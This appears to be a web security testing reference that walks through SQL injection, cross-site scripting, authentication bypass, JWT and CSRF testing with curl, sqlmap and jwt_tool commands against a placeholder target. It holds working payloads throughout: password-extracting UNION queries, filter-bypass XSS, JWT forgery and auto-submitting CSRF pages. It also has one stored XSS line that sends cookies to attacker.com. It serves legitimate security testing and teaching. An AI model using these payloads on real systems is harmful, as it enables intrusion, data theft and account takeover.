# OWASP Web Security Testing Guide

Reference documentation for OWASP WSTG web application security testing techniques. Covers SQL injection, cross-site scripting, authentication bypass, JWT security, and CSRF testing methodologies.

## SQL Injection Testing

### Basic SQL Injection

Test for SQL injection by injecting single quotes and boolean conditions into parameters:

```bash
# Basic single-quote test
curl "https://target.example.com/api/users?id=1'"

# Boolean-based detection
curl "https://target.example.com/api/users?id=1 AND 1=1"
curl "https://target.example.com/api/users?id=1 AND 1=2"

# String-based injection in login forms
curl -X POST https://target.example.com/login \
  -d "username=admin' OR '1'='1&password=anything"
```

If the first boolean query returns data and the second does not, the parameter is injectable.

### Blind SQL Injection

When the application does not return query results directly, use time-based or conditional techniques:

```bash
# Time-based blind SQLi (MySQL)
curl "https://target.example.com/api/users?id=1 AND SLEEP(5)"

# Time-based blind SQLi (PostgreSQL)
curl "https://target.example.com/api/users?id=1; SELECT pg_sleep(5)--"

# Conditional blind SQLi
curl "https://target.example.com/api/users?id=1 AND SUBSTRING(@@version,1,1)='5'"

# Boolean blind extraction (one character at a time)
curl "https://target.example.com/api/users?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64"
```

### UNION-Based SQL Injection

Extract data by appending UNION SELECT to the original query:

```bash
# Determine number of columns with ORDER BY
curl "https://target.example.com/api/users?id=1 ORDER BY 1--"
curl "https://target.example.com/api/users?id=1 ORDER BY 2--"
curl "https://target.example.com/api/users?id=1 ORDER BY 3--"

# UNION-based extraction (adjust column count)
curl "https://target.example.com/api/users?id=-1 UNION SELECT NULL,username,password FROM users--"

# Extract database metadata
curl "https://target.example.com/api/users?id=-1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
```

### Automated Testing with sqlmap

```bash
# Basic sqlmap scan
sqlmap -u "https://target.example.com/api/users?id=1" --batch

# POST request with form data
sqlmap -u "https://target.example.com/login" --data="username=admin&password=test" --batch

# Enumerate databases
sqlmap -u "https://target.example.com/api/users?id=1" --dbs --batch

# Dump specific table
sqlmap -u "https://target.example.com/api/users?id=1" -D targetdb -T users --dump --batch

# Use specific injection technique (time-based)
sqlmap -u "https://target.example.com/api/users?id=1" --technique=T --batch

# Test with authentication cookie
sqlmap -u "https://target.example.com/api/users?id=1" --cookie="session=abc123" --batch
```

## Cross-Site Scripting (XSS) Testing

### Reflected XSS

Reflected XSS occurs when user input is immediately returned in the response without sanitization:

```bash
# Basic reflected XSS test
curl "https://target.example.com/search?q=<script>alert('XSS')</script>"

# XSS in URL path
curl "https://target.example.com/page/<script>alert(1)</script>"

# Event handler injection
curl "https://target.example.com/search?q=\"onmouseover=\"alert(1)"

# Image tag injection
curl "https://target.example.com/search?q=<img src=x onerror=alert(1)>"
```

### Stored XSS

Stored XSS persists in the application database and executes when other users view the content:

```bash
# Submit stored XSS payload via comment form
curl -X POST https://target.example.com/api/comments \
  -H "Content-Type: application/json" \
  -d '{"body": "<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>"}'

# Stored XSS in profile fields
curl -X PUT https://target.example.com/api/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"displayName": "<img src=x onerror=alert(document.domain)>"}'
```

### DOM-Based XSS

DOM-based XSS executes entirely in the browser when JavaScript reads from a source and writes to a sink:

```html
<!-- Vulnerable pattern: innerHTML from URL hash -->
<script>
  // VULNERABLE: document.getElementById('output').innerHTML = location.hash.slice(1);
  // Test URL: https://target.example.com/page#<img src=x onerror=alert(1)>
</script>

<!-- Vulnerable pattern: eval from URL parameter -->
<script>
  // VULNERABLE: eval(new URLSearchParams(location.search).get('callback'));
  // Test URL: https://target.example.com/page?callback=alert(document.cookie)
</script>
```

Common DOM XSS sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data.

Common DOM XSS sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `setInterval()`.

### Filter Bypass Techniques

```bash
# Case variation
curl "https://target.example.com/search?q=<ScRiPt>alert(1)</ScRiPt>"

# Encoding bypass (URL encoding)
curl "https://target.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# Double encoding
curl "https://target.example.com/search?q=%253Cscript%253Ealert(1)%253C/script%253E"

# Tag bypass with SVG
curl "https://target.example.com/search?q=<svg/onload=alert(1)>"

# Without parentheses
curl "https://target.example.com/search?q=<img src=x onerror=alert\`1\`>"

# Without alert keyword
curl "https://target.example.com/search?q=<img src=x onerror=prompt(1)>"

# Using JavaScript protocol
curl "https://target.example.com/redirect?url=javascript:alert(1)"
```

## Authentication Bypass Testing

### Forced Browsing

Test access to resources without proper authentication:

```bash
# Access admin panel without authentication
curl https://target.example.com/admin/dashboard
curl https://target.example.com/admin/users

# Access API endpoints directly
curl https://target.example.com/api/v1/admin/config

# Access backup or debug endpoints
curl https://target.example.com/debug
curl https://target.example.com/backup.sql
curl https://target.example.com/.env
```

### Parameter Manipulation

```bash
# Modify role parameter
curl -X POST https://target.example.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "pass123", "role": "admin"}'

# IDOR (Insecure Direct Object Reference)
curl https://target.example.com/api/users/1 \
  -H "Authorization: Bearer USER_TOKEN"
curl https://target.example.com/api/users/2 \
  -H "Authorization: Bearer USER_TOKEN"

# Modify hidden form fields
curl -X POST https://target.example.com/transfer \
  -d "amount=100&from=attacker_account&to=attacker_account&isAdmin=true"

# HTTP method tampering
curl -X PUT https://target.example.com/api/users/1/role \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### Cookie Manipulation

```bash
# Test default or weak session cookies
curl https://target.example.com/dashboard \
  -H "Cookie: session=admin"

# Test predictable session tokens
curl https://target.example.com/dashboard \
  -H "Cookie: session=1"

# Test role stored in cookie
curl https://target.example.com/admin \
  -H "Cookie: session=valid_session; role=admin"

# Base64-encoded cookie manipulation
echo -n '{"user":"attacker","role":"admin"}' | base64
# Use the encoded value
curl https://target.example.com/dashboard \
  -H "Cookie: session=eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ=="
```

## JWT Security Testing

Test JSON Web Token implementations for common vulnerabilities:

```bash
# Decode JWT without verification (inspect claims)
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.sig" | cut -d. -f2 | base64 -d

# Algorithm None attack - set alg to "none"
# Header: {"alg": "none", "typ": "JWT"}
# Payload: {"sub": "admin", "role": "admin"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'
# Combine: header.payload.
curl https://target.example.com/api/protected \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

# Test for weak HMAC secret with jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Key confusion attack (RS256 to HS256)
# If the server uses RS256, try signing with HS256 using the public key as the secret
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

# Test expired token acceptance
curl https://target.example.com/api/protected \
  -H "Authorization: Bearer <EXPIRED_JWT>"

# Test token with modified claims
# Change "role": "user" to "role": "admin" and re-sign if key is known
```

## CSRF Testing

Cross-Site Request Forgery testing verifies that state-changing requests require proper origin validation:

```bash
# Check for CSRF token in forms
curl -s https://target.example.com/settings | grep -i "csrf\|token\|_token"

# Test state-changing request without CSRF token
curl -X POST https://target.example.com/api/settings \
  -H "Cookie: session=valid_session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@evil.com"

# Test with empty CSRF token
curl -X POST https://target.example.com/api/settings \
  -H "Cookie: session=valid_session" \
  -d "email=attacker@evil.com&csrf_token="

# Test with wrong CSRF token
curl -X POST https://target.example.com/api/settings \
  -H "Cookie: session=valid_session" \
  -d "email=attacker@evil.com&csrf_token=invalid_token_value"

# Check SameSite cookie attribute
curl -v https://target.example.com/login 2>&1 | grep -i "set-cookie"
# Look for: SameSite=Strict or SameSite=Lax

# Check for Origin/Referer header validation
curl -X POST https://target.example.com/api/settings \
  -H "Cookie: session=valid_session" \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com/page" \
  -d "email=attacker@evil.com"
```

### CSRF Proof-of-Concept HTML

```html
<!-- Auto-submitting form for CSRF PoC -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://target.example.com/api/settings" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
</html>

<!-- JSON-based CSRF with fetch -->
<html>
<body>
<script>
fetch('https://target.example.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
</body>
</html>
```
